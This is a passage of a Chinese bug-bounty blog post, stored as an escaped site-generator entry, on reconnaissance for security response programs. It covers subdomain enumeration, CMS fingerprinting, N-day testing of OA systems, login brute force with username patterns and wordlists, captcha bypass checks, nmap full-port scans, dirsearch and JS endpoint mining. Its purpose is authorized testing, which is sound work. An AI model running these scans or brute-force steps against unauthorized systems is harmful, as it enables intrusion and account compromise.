url文件内\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634968385558-f19e053b-b480-4bbb-8995-3cc50cb19ea1.png#clientId=u713ba10f-a757-4&from=paste&height=499&id=uc057208f&margin=%5Bobject%2Object%5D&name=image.png&originHeight=998&originWidth=1460&originalType=binary&ratio=1&size=357066&status=done&style=none&taskId=u2dd4f645-9400-4a16-90f9-567e1292a6c&width=730)\n## 0x05 框架型站点漏洞测试\n前面经过了子域名收集以及对收集到的子域名进行了指纹信息识别之后，那么对于框架型的站点，我们可以优先进行测试。\n类似用友NC、通达OA、蓝凌OA等，可以通过尝试现有的Nday漏洞进行攻击。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634971752296-14f4cc8b-a9ad-4f4a-a52d-b37290bf0889.png#clientId=u713ba10f-a757-4&from=paste&height=670&id=ue2eb2d79&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1340&originWidth=1796&originalType=binary&ratio=1&size=633891&status=done&style=none&taskId=uc617d959-80c1-4194-ba8a-5a20f30043a&width=898)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634971772511-ad2c33fa-0dcf-4e7b-8a36-ada77f0d208d.png#clientId=u713ba10f-a757-4&from=paste&height=660&id=uf7ff8327&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1320&originWidth=1360&originalType=binary&ratio=1&size=311843&status=done&style=none&taskId=u10544bf0-4a12-4c42-bf41-7e9c5d45057&width=680)\n## 0x06 非框架型站点漏洞测试\n前面测试完框架型的站点了，之后就应该往正常网站，或者经过了二开未能直接检测出指纹的站点进行渗透了。那么对于这类站点，最经常遇到的便是登录框，在这里，我们便可以开始测试了。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634972124912-1bf2fa5c-a1ac-40b0-b6b9-71fea6341075.png#clientId=u713ba10f-a757-4&from=paste&height=416&id=uc47928c9&margin=%5Bobject%2Object%5D&name=image.png&originHeight=832&originWidth=1322&originalType=binary&ratio=1&size=623185&status=done&style=none&taskId=ubc371a35-7ed8-4893-9488-84188fd50cf&width=661)\n1、用户名枚举\n抓包尝试是否用户名存在与不存在的情况，返回结果不同。\n2、验证码\n是否存在验证码，验证码是否可以抓包截断绕过，验证码是否可以为空。\n3、暴力破解\n下面是我收集的集中常见的用户名\n```\n1.弱口令用户名如admin,test,ceshi等\n2.员工姓名全拼，员工姓名简拼\n3.公司特征+员工工号/员工姓名\n4.员工工号+姓名简拼\n5.员工姓名全拼+员工工号\n6.员工姓名全拼+重复次数，如zhangsan和zhangsan01\n7.其他\n```\n关于暴力破解我要扯一句了，就是关于密码字典的问题。经常会听到某人说他的字典多么多么的大，有好几个G之类的，但是在我觉得，这很没有必要，有些密码是你跑几天都跑不出来的，就算字典确实够大，也没有必要这样跑，可能影响心情不说，大规模地暴力破解，很容易让人觉得你在拒绝服务攻击。\n​\n\n其实我的话一般跑一跑弱口令就差不多了。\n关于弱口令字典的问题，我也想说一嘴，你最好看看，你字典里面的admin、123456、password处在什么位置。记得之前玩CTF的时候，默认密码123456，但是那个师傅死活做不出来，后面一看，字典里面居然没有123456这个密码。。。\n​\n\n这里推荐一个字典，个人感觉还是挺好用的。当然更多的是需要自己不断更新。\n```\nhttps://github.com/fuzz-security/SuperWordlist\n```\n4、工具cupp和cewl\n对于一些情况，密码不是直接使用弱口令，而是通过一些公司的特征+个人信息制作的，那么这个时候，我们的字典便不能直接使用了，需要在这之前加上一些特征，例如阿里SRC可能是a；百度SRC可能是bd等。\n下面2款kali自带等工具，可以通过收集信息，生成好用的字典，方便渗透。说真的，在渗透测试过程中，弱口令，YYDS！\n具体使用说明和工具介绍，可以查看文章：\n[https://mp.weixin.qq.com/s/HOlPaJ4EMY7PfHh7p2d95A](https://mp.weixin.qq.com/s/HOlPaJ4EMY7PfHh7p2d95A)\n5、自行注册\n如果能够注册那就好办了，自己注册一下账户即可。\n6、小总结\n对于非框架的站点，登录接口一般是必不可少的，可能就在主页，也可能在某个路径下，藏着后台的登录接口，在尝试了多种方法成功登录之后，记得尝试里面是否存在未授权漏洞、越权等漏洞。\n这里借用来自WS师傅的建议：可以直接扫描出来的洞，基本都被交完了，可以更多往逻辑漏洞方面找。登录后的漏洞重复率，比登录前的往往会低很多。\n## 0x07 端口扫描\n前面就是正常的渗透了，那么一个域名只是在80、443端口才有web服务吗？不可否认有些时候真的是，但是绝大多数情况下，类似8080、8443、8081、8089、7001等端口，往往会有惊喜哦～\n端口扫描也算是老生常谈了，市面上也有很多介绍端口扫描的工具使用方法，这里也不细说了，就放出平时使用的命令吧。\n```\nsudo nmap -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeout 30 -T4 -v  examples.com\n\nsudo nmap -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeout 30 -T4 -v -p 1-65535 examples.com\n```\n## 0x08 目录扫描dirsearch\n目录扫描在渗透测试过程中我认为是必不可少的，一个站点在不同目录下的不同文件，往往可能有惊喜哦。\n个人是喜欢使用dirserach这款工具，不仅高效、页面也好看。市面上还有例如御剑、御剑t00ls版等，也是不错的选择。\ndirsearch下载地址：\n```\nhttps://github.com/maurosoria/dirsearch\n```\n具体使用方法可以查看github介绍，这里我一般是使用如下命令（因为担心线程太高所以通过-t参数设置为2）\n```\npython3 dirsearch.py -u www.xxx.com -e * -t 2\n```\n关键的地方是大家都可以下载这款工具，获取它自带的字典，那么路径的话，便是大家都能够搜得到的了，所以这里我推荐是可以适当整合一些师傅们发出来的路径字典到/dirsearch-0.4.2/db/dicc.txt中。例如我的话，是增加了springboot未授权的一些路径、swagger的路径以及一些例如vmvare-vcenter的漏洞路径。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634974064316-4b6934a1-20a6-4491-bd58-90ce95839dc2.png#clientId=u713ba10f-a757-4&from=paste&height=418&id=ucf26188a&margin=%5Bobject%2Object%5D&name=image.png&originHeight=836&originWidth=1364&originalType=binary&ratio=1&size=132938&status=done&style=none&taskId=uec31186e-75ff-4ff7-bd63-c714e41f7df&width=682)\n## 0x09 JS信息收集\n在一个站点扫描了目录、尝试登录失败并且没有自己注册功能的情况下，我们还可以从JS文件入手，获取一些URL，也许某个URL便能够未授权访问获取敏感信息呢。\n#### 1、JSFinder\n工具下载：\n```\nhttps://github.com/Threezh1/JSFinder\n```\nJSFinder是一款用作快速在网站的js文件中提取URL，子域名的工具。个人觉得美中不足的地方便是不能对获取到到URL进行一些过滤，在某些情况下，JS文件中可以爬取非常多的URL，这其中可能大部分是页面空或者返回200但是页面显示404的。来自HZ师傅的建议，可以修改一下工具，基于当前的基础上，检测获取的URL是否可以访问，访问后的页面大小为多少，标题是什么。。。\n思路放这了，找个时间改一改？\n```\n#检测URL状态码\n#-----------------------\n#! /usr/bin/env python\n#coding=utf-8\nimport sys\nimport requests\n\nurl='xxxx'\nrequest = requests.get(url)\nhttpStatusCode = request.status_code\nif httpStatusCode == 200:\n    xxxx\nelse:\n\t\txxxx\n```\n```\n#检测URL返回包大小\n#-----------------------\nimport requests\n\ndef hum_convert(value):\n    units = [\"B\", \"KB\", \"MB\", \"GB\", \"TB\", \"PB\"]\n    size = 1024.0\n    for i in range(len(units)):\n        if (value / size) < 1:\n            return \"%.2f%s\" % (value, units[i])\n        value = value / size\n\nr = requests.get('https://www.baidu.com')\nr.status_code\nr.headers\n\nlength = len(r.text)\nprint(hum_convert(length))\n```\n```\n#获取网站标题\n#-----------------------\n#!/usr/bin/python\n#coding=utf-8\n\nurllib.request\nimport urllib.request\nimport re\n\nurl = urllib.request.urlopen('http://www.xxx.com')\nhtml = url.read().decode('utf-8')\n\ntitle=re.findall('<title>(.+)</title>',html)\nprint (title)\n```\n#### 2、JS文件\nJS文件与HTML、CSS等文件统一作为前端文件，是可以通过浏览器访问到的，相对于HTML和CSS等文件的显示和美化作用，JS文件将会能够将页面的功能点进行升华。![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634979609194-1625b496-f395-46ef-a57b-d40812e3ca83.png#clientId=u713ba10f-a757-4&from=paste&height=41&id=udf5e6bd9&margin=%5Bobject%2Object%5D&name=image.png&originHeight=82&originWidth=1052&originalType=binary&ratio=1&size=16086&status=done&style=none&taskId=u48d38e72-9bd0-43d2-ad50-bcc0ce56aec&width=526)\n对于渗透测试来说，JS文件不仅仅能够找到一些URL、内网IP地址、手机号、调用的组件版本等信息，还存在一些接口，因为前端需要，所以一些接口将会在JS文件中直接或间接呈现。下面我将介绍如何发现这些隐藏的接口。\n1、首先在某个页面中，鼠标右键，选择检查![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634979847526-bc9f09c0-1a90-455d-ba9e-21f6a85077b2.png#clientId=u713ba10f-a757-4&from=paste&height=727&id=u06aaf698&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1454&originWidth=2364&originalType=binary&ratio=1&size=884946&status=done&style=none&taskId=u680f6578-9ead-4a4d-a566-d93f3fb8e26&width=1182)\n2、点击Application\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634979884349-2daca2ef-6982-41b2-bb71-5c764816e908.png#clientId=u713ba10f-a757-4&from=paste&height=399&id=u951102d4&margin=%5Bobject%2Object%5D&name=image.png&originHeight=798&originWidth=1772&originalType=binary&ratio=1&size=290368&status=done&style=none&taskId=ud0a0670c-1fa3-4315-867c-25409dd85f8&width=886)\n3、在Frames->top->Scripts中能够获取当前页面请求到的所有JS\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634979911722-aedd9206-580a-476c-aafe-5e99d91a2d47.png#clientId=u713ba10f-a757-4&from=paste&height=604&id=u785851a2&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1208&originWidth=1148&originalType=binary&ratio=1&size=133350&status=done&style=none&taskId=udc4effe1-a736-4b7d-884e-b10381b8c03&width=574)\n4、火狐浏览器的话，则是在调试中\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634980094740-b4afaf82-8f10-4f64-b368-da3faa3f5d93.png#clientId=u713ba10f-a757-4&from=paste&height=323&id=ua48ca828&margin=%5Bobject%2Object%5D&name=image.png&originHeight=646&originWidth=1646&originalType=binary&ratio=1&size=188824&status=done&style=none&taskId=ucae14475-c2e8-489d-98d3-a672350edf4&width=823)\n5、如果你请求的JS文件内容都叠在了前几行的话，下面这个键可以帮你美化输出\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634980174451-835cf97c-8c17-4d2a-a372-469073a78281.png#clientId=u713ba10f-a757-4&from=paste&height=269&id=u80fc4db5&margin=%5Bobject%2Object%5D&name=image.png&originHeight=850&originWidth=1420&originalType=binary&ratio=1&size=78688&status=done&style=none&taskId=ud815e24c-4503-40d1-a91c-ae3ec92a358&width=449)\n6、在JS文件中，可以尤为注意带有api字眼的文件或内容，例如下面这里我发现了一个接口。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634980516041-202ef7c0-0773-45fc-8ea0-8935ad385603.png#clientId=u713ba10f-a757-4&from=paste&height=427&id=udeb8bb8a&margin=%5Bobject%2Object%5D&name=image.png&originHeight=854&originWidth=1400&originalType=binary&ratio=1&size=199487&status=done&style=none&taskId=ue53b03c2-3b94-4dda-8b57-943ff687ffe&width=700)\n\n## 0x10 小程序、APP\n\nweb端没有思路的时候，可以结合小程序、APP来进行渗透。小程序或APP的服务端其实可以在一定程度上与web应用的服务端相联系。也就是说，我们在小程序或者APP上，一样能够挖掘web端的漏洞如SQL注入、XSS等，并且相对来说，这类等服务端安全措施会相对没有那么完备，所以在web端确实没有思路的时候，可以迂回渗透，从小程序、APP中进行。\n\n```\n#小程序抓包、APP抓包参考链接：\nhttps://mp.weixin.qq.com/s/xuoVxBsN-t5KcwuyGpR56g\nhttps://mp.weixin.qq.com/s/45YF4tBaR-TUsHyF5RvEsw\nhttps://mp.weixin.qq.com/s/M5xu_-_6fgp8q0KjpzvjLg\nhttps://mp.weixin.qq.com/s/Mfkbxtrxv5AvY-n_bMU7ig\n```\n\n## 0x11 总结\n\n​\t\t以上就是我个人挖掘SRC的一些信息收集思路，挖掘SRC有的时候真的很看运气，也许别人对一个接口简单Fuzz，便出了一个注入，而我们花了几天，还是一直看到返回内容为404。所以有的时候真的可以换个站试试，也许就挖到高危甚至严重了～\n​\t\t作为一名SRC小白，以上内容均为小弟拙见，希望能够通过这篇文章，帮到更多的网络安全小白，没能帮上大佬们真的很抱歉～后续也会持续提高自己，将学到的更多的东西分享给大家。\n","source":"_posts/src漏洞挖掘之有效信息收集.md","raw":"---\ntitle: src漏洞挖掘之有效信息收集\ntags: \n  - SRC\n  - 信息收集\n  - 漏洞挖掘\ncategories: web安全\nkeywords: 'SRC,信息收集,漏洞挖掘'\ndescription: src漏洞挖掘之有效信息收集\ncover: /images/src_wajue.png\ndate: 2021-10-25 10:45:41\n\n---\n\n<meta name=\"referrer\" content=\"no-referrer\"/>\n\n> 本文已发布到先知社区\n>\n> 作者：ajie\n\n    \n    说到信息收集，网上已经有许多文章进行描述了，那么从正常的子域名、端口、旁站、C段等进行信息收集的话，对于正常项目已经够用了，但是挖掘SRC的话，在诸多竞争对手的“帮助”下，大家收集到的信息都差不多，挖掘的漏洞也往往存在重复的情况。\n      那么现在我就想分享一下平时自己进行SRC挖掘过程中，主要是如何进行入手的。以下均为小弟拙见，大佬勿喷。\n## 0x01 确定目标\n个人是非常讨厌无目标随便打的，有没有自己对应的SRC应急响应平台不说，还往往会因为一开始没有挖掘到漏洞而随意放弃，这样往往不能挖掘到深层次的漏洞。挖到的大多数是大家都可以简单挖到的漏洞，存在大概率重复可能。所以在真的想要花点时间在SRC漏洞挖掘上的话，建议先选好目标。\n\t那么目标怎么选呢，考虑到收益回报与付出的比例来看，建议是从专属SRC入手，特别在一些活动中，可以获取比平时更高的收益。\n微信搜一搜：\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634919905280-6a3474d5-e288-40e0-be14-a11ca5a37bcb.png#clientId=u713ba10f-a757-4&from=paste&height=660&id=u8b4a879d&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1320&originWidth=1360&originalType=binary&ratio=1&size=333456&status=done&style=none&taskId=u74e51aee-8625-4c5e-b368-f880fa9654b&width=680)\n百度搜一搜：\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634919958148-21279f08-65f5-45e2-93cc-37781713440c.png#clientId=u713ba10f-a757-4&from=paste&height=668&id=ubea7849e&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1336&originWidth=1784&originalType=binary&ratio=1&size=467822&status=done&style=none&taskId=u40ba20aa-3b6f-465a-b6ff-105b03a1cac&width=892)\n现在有活动的src已经浮现水面了，那么我们就可与从中选择自己感兴趣的SRC。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634963068419-ddbf4fb7-605b-46a5-aa91-139da2bd03c9.png#clientId=u713ba10f-a757-4&from=paste&height=706&id=u4d43608b&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1412&originWidth=1726&originalType=binary&ratio=1&size=575771&status=done&style=none&taskId=u7150b32d-8964-4f4b-8100-3de307b4870&width=863)\n\n## 0x02 确认测试范围\n前面说到确定测什么SRC，那么下面就要通过一些方法，获取这个SRC的测试范围，以免测偏。\n### 1、公众号\n从公众号推文入手，活动页面中可以发现测试范围\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634963158654-f2016b05-9be3-4cd7-9bda-ea55a87defb1.png#clientId=u713ba10f-a757-4&from=paste&height=630&id=u077f22ee&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1260&originWidth=1452&originalType=binary&ratio=1&size=190701&status=done&style=none&taskId=u56153bbe-9613-4ac9-96e0-549a84f1c4b&width=726)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634963557707-c9d9fa67-1108-49c4-b38a-a74b34a3907f.png#clientId=u713ba10f-a757-4&from=paste&height=630&id=u1c25375f&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1260&originWidth=1452&originalType=binary&ratio=1&size=285450&status=done&style=none&taskId=ue71919ac-0609-45cc-bc63-c3b9f4d2e1c&width=726)\n### 2、应急响应官网\n在应急响应官网，往往会有一些活动的公告，在里面可以获取到相应的测试范围。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634963624546-d5d91332-8080-4b77-9972-77fc8abb52bb.png#clientId=u713ba10f-a757-4&from=paste&height=627&id=u128b3210&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1254&originWidth=2206&originalType=binary&ratio=1&size=321049&status=done&style=none&taskId=u0aa25af0-c011-434c-92f5-f7e3a65d236&width=1103)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634963709884-04818b7a-2686-4c31-b96b-270fd21af35b.png#clientId=u713ba10f-a757-4&from=paste&height=656&id=u3228ec56&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1312&originWidth=2382&originalType=binary&ratio=1&size=592096&status=done&style=none&taskId=u83999522-9aaa-4b01-b710-a57b9ff4f7f&width=1191)\n### 3、爱企查\n从爱企查等商业查询平台获取公司所属域名\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634964085716-15745fa8-785a-4209-b610-668ece5133a0.png#clientId=u713ba10f-a757-4&from=paste&height=484&id=u412ef52f&margin=%5Bobject%2Object%5D&name=image.png&originHeight=968&originWidth=2188&originalType=binary&ratio=1&size=786218&status=done&style=none&taskId=u55826600-0854-44f8-accb-54e3f12c347&width=1094)\n搜索想要测试等SRC所属公司名称，在知识产权->网站备案中可以获取测试范围。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634964167749-6d7913b9-a4be-41ce-a417-88f49ebd7673.png#clientId=u713ba10f-a757-4&from=paste&height=567&id=u96bf1fb3&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1134&originWidth=1884&originalType=binary&ratio=1&size=298889&status=done&style=none&taskId=ua446ee4f-aa26-41c6-8e34-ba5e91db54e&width=942)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634964215181-046d3df9-0dbb-44f2-ba89-59ecdee77f71.png#clientId=u713ba10f-a757-4&from=paste&height=665&id=uf3208897&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1330&originWidth=1836&originalType=binary&ratio=1&size=280408&status=done&style=none&taskId=u8bb717b4-4748-4fbd-b919-6102ba1883b&width=918)\n## 0x03 子域名(oneforall)\n拿到域名之后，下一步我考虑使用oneforall扫描获取子域名，就像网上信息收集的文章一样，主域名的站点不是静态界面就是安全防护等级极强，不是随便就能够发现漏洞的，我们挖掘SRC也是要从子域名开始，从边缘资产或一般资产中发现漏洞。\n工具下载：\n```\nhttps://github.com/shmilylty/OneForAll\n```\n具体用法如下：\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634967168625-da7d57b5-19e1-4f9c-91a2-cd55e8072344.png#clientId=u713ba10f-a757-4&from=paste&height=442&id=u73c9b970&margin=%5Bobject%2Object%5D&name=image.png&originHeight=884&originWidth=1460&originalType=binary&ratio=1&size=385397&status=done&style=none&taskId=ub7b3972f-c412-4a4e-a3c0-224717feaa2&width=730)\t\n常用的获取子域名有2种选择，一种使用--target指定单个域名，一种使用--targets指定域名文件。\n```\npython3 oneforall.py --target example.com run\npython3 oneforall.py --targets ./domains.txt run\n```\n其他获取子域名的工具还有layer子域名挖掘机、Sublist3r、证书透明度、在线工具等，这里就不一一阐述了，大体思路是一样等，获取子域，然后从中筛选边缘资产，安全防护低资产。\n## 0x04 系统指纹探测\n通过上面的方法，我们可以在/OneForAll-0.4.3/results/路径下获取以域名为名字的csv文件。里面放入到便是扫描到到所有子域名以及相应信息了。\n下一步便是将收集到到域名全部进行一遍指纹探测，从中找出一些明显使用CMS、OA系统、shiro、Fastjson等的站点。下面介绍平时使用的2款工具：\n### 1、Ehole\n下载地址：\n```\nhttps://github.com/EdgeSecurityTeam/EHole\n```\n使用方法：\n```\n./Ehole-darwin -l url.txt   //URL地址需带上协议,每行一个\n./Ehole-darwin -f 192.168.1.1/24  //支持单IP或IP段,fofa识别需要配置fofa密钥和邮箱\n./Ehole-darwin -l url.txt -json export.json  //结果输出至export.json文件\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634968178111-36292547-bea8-487c-a8cf-722c63427df3.png#clientId=u713ba10f-a757-4&from=paste&height=415&id=u3671b8ae&margin=%5Bobject%2Object%5D&name=image.png&originHeight=830&originWidth=1460&originalType=binary&ratio=1&size=320488&status=done&style=none&taskId=u181ebb87-7fc2-4806-81f9-6a3c42cf463&width=730)\n### 2、Glass\n下载地址：\n```\nhttps://github.com/s7ckTeam/Glass\n```\n使用方法：\n```\npython3 Glass.py -u http://www.examples.com  // 单url测试\npython3 Glass.py -w domain.txt -o 1.txt  // url文件内\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634968385558-f19e053b-b480-4bbb-8995-3cc50cb19ea1.png#clientId=u713ba10f-a757-4&from=paste&height=499&id=uc057208f&margin=%5Bobject%2Object%5D&name=image.png&originHeight=998&originWidth=1460&originalType=binary&ratio=1&size=357066&status=done&style=none&taskId=u2dd4f645-9400-4a16-90f9-567e1292a6c&width=730)\n## 0x05 框架型站点漏洞测试\n前面经过了子域名收集以及对收集到的子域名进行了指纹信息识别之后，那么对于框架型的站点，我们可以优先进行测试。\n类似用友NC、通达OA、蓝凌OA等，可以通过尝试现有的Nday漏洞进行攻击。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634971752296-14f4cc8b-a9ad-4f4a-a52d-b37290bf0889.png#clientId=u713ba10f-a757-4&from=paste&height=670&id=ue2eb2d79&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1340&originWidth=1796&originalType=binary&ratio=1&size=633891&status=done&style=none&taskId=uc617d959-80c1-4194-ba8a-5a20f30043a&width=898)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634971772511-ad2c33fa-0dcf-4e7b-8a36-ada77f0d208d.png#clientId=u713ba10f-a757-4&from=paste&height=660&id=uf7ff8327&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1320&originWidth=1360&originalType=binary&ratio=1&size=311843&status=done&style=none&taskId=u10544bf0-4a12-4c42-bf41-7e9c5d45057&width=680)\n## 0x06 非框架型站点漏洞测试\n前面测试完框架型的站点了，之后就应该往正常网站，或者经过了二开未能直接检测出指纹的站点进行渗透了。那么对于这类站点，最经常遇到的便是登录框，在这里，我们便可以开始测试了。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634972124912-1bf2fa5c-a1ac-40b0-b6b9-71fea6341075.png#clientId=u713ba10f-a757-4&from=paste&height=416&id=uc47928c9&margin=%5Bobject%2Object%5D&name=image.png&originHeight=832&originWidth=1322&originalType=binary&ratio=1&size=623185&status=done&style=none&taskId=ubc371a35-7ed8-4893-9488-84188fd50cf&width=661)\n1、用户名枚举\n抓包尝试是否用户名存在与不存在的情况，返回结果不同。\n2、验证码\n是否存在验证码，验证码是否可以抓包截断绕过，验证码是否可以为空。\n3、暴力破解\n下面是我收集的集中常见的用户名\n```\n1.弱口令用户名如admin,test,ceshi等\n2.员工姓名全拼，员工姓名简拼\n3.公司特征+员工工号/员工姓名\n4.员工工号+姓名简拼\n5.员工姓名全拼+员工工号\n6.员工姓名全拼+重复次数，如zhangsan和zhangsan01\n7.其他\n```\n关于暴力破解我要扯一句了，就是关于密码字典的问题。经常会听到某人说他的字典多么多么的大，有好几个G之类的，但是在我觉得，这很没有必要，有些密码是你跑几天都跑不出来的，就算字典确实够大，也没有必要这样跑，可能影响心情不说，大规模地暴力破解，很容易让人觉得你在拒绝服务攻击。\n​\n\n其实我的话一般跑一跑弱口令就差不多了。\n关于弱口令字典的问题，我也想说一嘴，你最好看看，你字典里面的admin、123456、password处在什么位置。记得之前玩CTF的时候，默认密码123456，但是那个师傅死活做不出来，后面一看，字典里面居然没有123456这个密码。。。\n​\n\n这里推荐一个字典，个人感觉还是挺好用的。当然更多的是需要自己不断更新。\n```\nhttps://github.com/fuzz-security/SuperWordlist\n```\n4、工具cupp和cewl\n对于一些情况，密码不是直接使用弱口令，而是通过一些公司的特征+个人信息制作的，那么这个时候，我们的字典便不能直接使用了，需要在这之前加上一些特征，例如阿里SRC可能是a；百度SRC可能是bd等。\n下面2款kali自带等工具，可以通过收集信息，生成好用的字典，方便渗透。说真的，在渗透测试过程中，弱口令，YYDS！\n具体使用说明和工具介绍，可以查看文章：\n[https://mp.weixin.qq.com/s/HOlPaJ4EMY7PfHh7p2d95A](https://mp.weixin.qq.com/s/HOlPaJ4EMY7PfHh7p2d95A)\n5、自行注册\n如果能够注册那就好办了，自己注册一下账户即可。\n6、小总结\n对于非框架的站点，登录接口一般是必不可少的，可能就在主页，也可能在某个路径下，藏着后台的登录接口，在尝试了多种方法成功登录之后，记得尝试里面是否存在未授权漏洞、越权等漏洞。\n这里借用来自WS师傅的建议：可以直接扫描出来的洞，基本都被交完了，可以更多往逻辑漏洞方面找。登录后的漏洞重复率，比登录前的往往会低很多。\n## 0x07 端口扫描\n前面就是正常的渗透了，那么一个域名只是在80、443端口才有web服务吗？不可否认有些时候真的是，但是绝大多数情况下，类似8080、8443、8081、8089、7001等端口，往往会有惊喜哦～\n端口扫描也算是老生常谈了，市面上也有很多介绍端口扫描的工具使用方法，这里也不细说了，就放出平时使用的命令吧。\n```\nsudo nmap -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeout 30 -T4 -v  examples.com\n\nsudo nmap -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeout 30 -T4 -v -p 1-65535 examples.com\n```\n## 0x08 目录扫描dirsearch\n目录扫描在渗透测试过程中我认为是必不可少的，一个站点在不同目录下的不同文件，往往可能有惊喜哦。\n个人是喜欢使用dirserach这款工具，不仅高效、页面也好看。市面上还有例如御剑、御剑t00ls版等，也是不错的选择。\ndirsearch下载地址：\n```\nhttps://github.com/maurosoria/dirsearch\n```\n具体使用方法可以查看github介绍，这里我一般是使用如下命令（因为担心线程太高所以通过-t参数设置为2）\n```\npython3 dirsearch.py -u www.xxx.com -e * -t 2\n```\n关键的地方是大家都可以下载这款工具，获取它自带的字典，那么路径的话，便是大家都能够搜得到的了，所以这里我推荐是可以适当整合一些师傅们发出来的路径字典到/dirsearch-0.4.2/db/dicc.txt中。例如我的话，是增加了springboot未授权的一些路径、swagger的路径以及一些例如vmvare-vcenter的漏洞路径。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634974064316-4b6934a1-20a6-4491-bd58-90ce95839dc2.png#clientId=u713ba10f-a757-4&from=paste&height=418&id=ucf26188a&margin=%5Bobject%2Object%5D&name=image.png&originHeight=836&originWidth=1364&originalType=binary&ratio=1&size=132938&status=done&style=none&taskId=uec31186e-75ff-4ff7-bd63-c714e41f7df&width=682)\n## 0x09 JS信息收集\n在一个站点扫描了目录、尝试登录失败并且没有自己注册功能的情况下，我们还可以从JS文件入手，获取一些URL，也许某个URL便能够未授权访问获取敏感信息呢。\n#### 1、JSFinder\n工具下载：\n```\nhttps://github.com/Threezh1/JSFinder\n```\nJSFinder是一款用作快速在网站的js文件中提取URL，子域名的工具。个人觉得美中不足的地方便是不能对获取到到URL进行一些过滤，在某些情况下，JS文件中可以爬取非常多的URL，这其中可能大部分是页面空或者返回200但是页面显示404的。来自HZ师傅的建议，可以修改一下工具，基于当前的基础上，检测获取的URL是否可以访问，访问后的页面大小为多少，标题是什么。。。\n思路放这了，找个时间改一改？\n```\n#检测URL状态码\n#-----------------------\n#! /usr/bin/env python\n#coding=utf-8\nimport sys\nimport requests\n\nurl='xxxx'\nrequest = requests.get(url)\nhttpStatusCode = request.status_code\nif httpStatusCode == 200:\n    xxxx\nelse:\n\t\txxxx\n```\n```\n#检测URL返回包大小\n#-----------------------\nimport requests\n\ndef hum_convert(value):\n    units = [\"B\", \"KB\", \"MB\", \"GB\", \"TB\", \"PB\"]\n    size = 1024.0\n    for i in range(len(units)):\n        if (value / size) < 1:\n            return \"%.2f%s\" % (value, units[i])\n        value = value / size\n\nr = requests.get('https://www.baidu.com')\nr.status_code\nr.headers\n\nlength = len(r.text)\nprint(hum_convert(length))\n```\n```\n#获取网站标题\n#-----------------------\n#!/usr/bin/python\n#coding=utf-8\n\nurllib.request\nimport urllib.request\nimport re\n\nurl = urllib.request.urlopen('http://www.xxx.com')\nhtml = url.read().decode('utf-8')\n\ntitle=re.findall('<title>(.+)</title>',html)\nprint (title)\n```\n#### 2、JS文件\nJS文件与HTML、CSS等文件统一作为前端文件，是可以通过浏览器访问到的，相对于HTML和CSS等文件的显示和美化作用，JS文件将会能够将页面的功能点进行升华。![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634979609194-1625b496-f395-46ef-a57b-d40812e3ca83.png#clientId=u713ba10f-a757-4&from=paste&height=41&id=udf5e6bd9&margin=%5Bobject%2Object%5D&name=image.png&originHeight=82&originWidth=1052&originalType=binary&ratio=1&size=16086&status=done&style=none&taskId=u48d38e72-9bd0-43d2-ad50-bcc0ce56aec&width=526)\n对于渗透测试来说，JS文件不仅仅能够找到一些URL、内网IP地址、手机号、调用的组件版本等信息，还存在一些接口，因为前端需要，所以一些接口将会在JS文件中直接或间接呈现。下面我将介绍如何发现这些隐藏的接口。\n1、首先在某个页面中，鼠标右键，选择检查![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634979847526-bc9f09c0-1a90-455d-ba9e-21f6a85077b2.png#clientId=u713ba10f-a757-4&from=paste&height=727&id=u06aaf698&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1454&originWidth=2364&originalType=binary&ratio=1&size=884946&status=done&